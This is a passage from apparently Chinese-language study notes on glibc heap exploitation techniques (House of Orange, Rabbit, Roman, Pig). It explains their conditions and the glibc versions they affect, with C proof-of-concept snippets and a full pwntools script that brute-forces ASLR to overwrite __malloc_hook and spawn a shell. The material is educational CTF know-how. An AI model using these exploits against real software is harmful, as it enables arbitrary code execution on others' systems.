class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;Nice jump d00d&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//bck</span></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);<span class="comment">//阻止victim合并到top</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);<span class="comment">//到unsortedbin中</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);<span class="comment">//victim从unsortedbin中被取出</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">//bk</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);<span class="comment">//触发,下一次取出就是取出fakechunk</span></span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);<span class="comment">//p4就是(intptr_t*)stack_buffer_1 + 2</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; </span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><h2 id="概要-3"><a href="#概要-3" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>要能够申请一个比top_size更大但是小于0x20000的size(任意大小申请,多次申请,top-size修改)</li>
</ol>
<p><strong>利用效果:</strong>在无free下放入一个chunk到unsortedbin中</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
<p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Otherwise, relay to handle system-dependent cases</span><br><span class="line">*/</span><br><span class="line">else &#123;</span><br><span class="line">      void *p = sysmalloc(nb, av);</span><br><span class="line">      if (p != NULL &amp;&amp; __builtin_expect (perturb_byte, 0))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      return p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 <strong>brk</strong> 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p>
<p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long)(nb) &gt;= (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure>
<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 <strong>128K</strong>，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p>
<p><strong>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == 0) ||</span><br><span class="line">     ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((unsigned long)old_end &amp; pagemask) == 0));</span><br></pre></td></tr></table></figure>
<p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小<strong>必须大于等于 MINSIZE</strong>，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 <strong>top chunk 必须标识前一个 chunk 处于 inuse 状态</strong>，并且 <strong>top chunk 的结束地址必定是页对齐的</strong>。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p>
<p>总结一下伪造的 top chunk size 的要求</p>
<ol>
<li><strong>伪造的 size 必须要对齐到内存页</strong></li>
<li>size 要大于等于 MINSIZE</li>
<li>size 要小于之后申请的 chunk size + MINSIZE</li>
<li>size 的 prev inuse 位必须为 1</li>
</ol>
<p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p>
<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><strong>2016 hiton house of orange</strong></p>
<h1 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h1><h2 id="概要-4"><a href="#概要-4" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中，因为 unsorted bin 等其它的 bin 有更好的利用手段。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>可以修改 fastbin 的 fd 指针或 size </li>
<li>可以触发 malloc consolidate</li>
</ol>
<p><strong>利用效果:</strong>overlap</p>
<p><strong>有效版本:</strong>2.27以前</p>
<p><strong>失效原因:</strong>2.27及以后malloc_consolidate也开始进行检查了</p>
<h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。</p>
<p>而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块，为进一步的利用做准备</p>
<p> <code>POC 1</code>: modify the size of fastbin chunk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned long* chunk1=malloc(0x40); //0x602000</span><br><span class="line">unsigned long* chunk2=malloc(0x40); //0x602050</span><br><span class="line">malloc(0x10);</span><br><span class="line">free(chunk1);</span><br><span class="line">free(chunk2);</span><br><span class="line"></span><br><span class="line">chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1</span><br><span class="line">malloc(0x1000);  //allocate a large chunk, trigger malloc consolidate</span><br></pre></td></tr></table></figure>
<p><code>POC 2</code>:modify FD pointer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unsigned long* chunk1=malloc(0x40); //0x602000</span><br><span class="line">unsigned long* chunk2=malloc(0x100);//0x602050</span><br><span class="line"></span><br><span class="line">chunk2[1]=0x31; //fake chunk size 0x30</span><br><span class="line">chunk2[7]=0x21  //fake chunk&#x27;s next chunk</span><br><span class="line">chunk2[11]=0x21 //fake chunk&#x27;s next chunk&#x27;s next chuck</span><br><span class="line"></span><br><span class="line">free(chunk1);</span><br><span class="line">chuck1[0]=0x602060;// modify the fd of chunk1</span><br><span class="line">malloc(5000);// malloc a  big chunk to trigger malloc consolidate</span><br></pre></td></tr></table></figure>
<p>原理很简单，就是通过修改 fastbin chunk 的 size(如上面的 POC 1 所示) 直接构造 overlap chunk，或者修改 fd(如面的 POC 2 所示)，让它指向一个 fake chunk，触发 malloc consolidate 之后让这个 fake chunk 成为一个合法的 chunk。</p>
<h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><p><strong>HITB-GSEC-XCTF 2018 mutepig</strong></p>
<h1 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h1><h2 id="概要-5"><a href="#概要-5" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Roman是 fastbin attack(tcache也行) 和 Unsortbin attack 结合的一个用于绕过ASLR(利用 12-bit 的爆破)来达到获取 shell 的目的的技巧。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>UAF</li>
<li>任意大小chunk申请</li>
</ol>
<p><strong>利用效果:</strong>bypass ALSR</p>
<p><strong>有效版本:</strong>2.29以前</p>
<p><strong>失效原因:</strong>2.29及以后unsortedbin attack失效</p>
<h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><p>作者给了一个demo,以此来学习该技术</p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/hor&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>程序实现了增删改功能,其中free未置0,edit可以off-by-one</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./hor&quot;</span>,aslr=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">	p.recvuntil(<span class="string">&quot;3. Free&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,idx</span>):</span><br><span class="line">	menu()</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	menu()</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">	menu()</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">name = <span class="string">b&quot;A&quot;</span>*<span class="number">20</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line">create(<span class="number">24</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line">fake = <span class="string">b&quot;A&quot;</span>*<span class="number">104</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line"></span><br><span class="line">create(<span class="number">101</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">over = <span class="string">b&quot;A&quot;</span>*<span class="number">24</span></span><br><span class="line">over += <span class="string">b&quot;\x71&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">create(<span class="number">101</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">15</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">16</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">17</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">18</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">19</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">heap_po = <span class="string">b&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line"></span><br><span class="line">arena_po = <span class="string">b&quot;\xed\x8a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,arena_po)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Control arena through 0.</span></span><br><span class="line"><span class="comment"># Now unsorted bin attack.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># First fix 0x71 freelist.</span></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fixed.</span></span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">24</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">po = <span class="string">b&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">b&quot;\x00\x8b&quot;</span></span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line"></span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#4527a</span></span><br><span class="line">over = <span class="string">b&quot;R&quot;</span>*<span class="number">19</span></span><br><span class="line">over += <span class="string">b&quot;\x7a\x92\xf3&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">create(<span class="number">200</span>,<span class="number">7</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	resp = p.recv(<span class="number">4</span>, timeout=<span class="number">6</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	p.close()</span><br></pre></td></tr></table></figure>
<p>只有1/65536的概率成功</p>
<p>流程大致如下:</p>
<ol>
<li>将一个unsortedbin范围的chunk-A进行free使main_arena+88写入</li>
<li>修改A的size为0x71</li>
<li>挂两个0x71的chunk进入fastbin</li>
<li>部分写使A被挂入fastbin</li>
<li>第一次爆破写&amp;__malloc_hook-0x23到A的fd(1/16)</li>
<li>将__malloc_hook-0x23申请出来</li>
<li>修复fastbin</li>
<li>将一个chunk-B放入unsortedbin中,部分写bk为&amp;<em>_malloc_hook-0x10,利用unsorted攻击写入main_arena+88至&amp;\</em>_malloc_hook</li>
<li>第二次爆破写__malloc_hook为one_gadget(1/4096)</li>
</ol>
<p>还挺复杂的,主要就是部分写覆盖main_arena+88进行爆破</p>
<h1 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h1><h2 id="概要-6"><a href="#概要-6" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Pig 是一个将 Tcache Stash Unlink+ Attack 和 FSOP 结合的攻击，同时使用到了 Largebin Attack 进行辅助。主要适用于 libc 2.31 及以后的新版本 libc 并且程序中仅有 calloc 时。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>UAF</li>
<li>能执行 abort 流程或程序显式调用 exit 或程序能通过主函数返回</li>
</ol>
<p><strong>利用效果:</strong>在无malloc函数下利用tcache操作__free_hook</p>
<p><strong>适用情况:</strong>只有calloc函数,glibc231以上</p>
<p><strong>有效版本:</strong></p>
<h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>主要利用的函数为 <code>_IO_str_overflow</code></p>
<p>利用流程为</p>
<ol>
<li>进行一个 Tcache Stash Unlink+ 攻击，把地址 <code>__free_hook - 0x10</code> 写入 tcache_pthread_struct。由于该攻击要求 <code>__free_hook - 0x8</code> 处存储一个指向可写内存的指针，所以在此之前需要进行一次 large bin attack。</li>
<li>再进行一个 large bin attack，修改 <code>_IO_list_all</code> 为一个堆地址，然后在该处伪造 <code>_IO_FILE</code> 结构体。</li>
<li>通过伪造的结构体触发 <code>_IO_str_overflow</code> getshell。</li>
</ol>
<p>这是_IO_str_overflow的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      <span class="built_in">free</span> (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">	  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>
<p>重点看这部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line"><span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (old_buf)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">    <span class="built_in">free</span> (old_buf);</span><br><span class="line">    <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">    fp-&gt;_IO_buf_base = <span 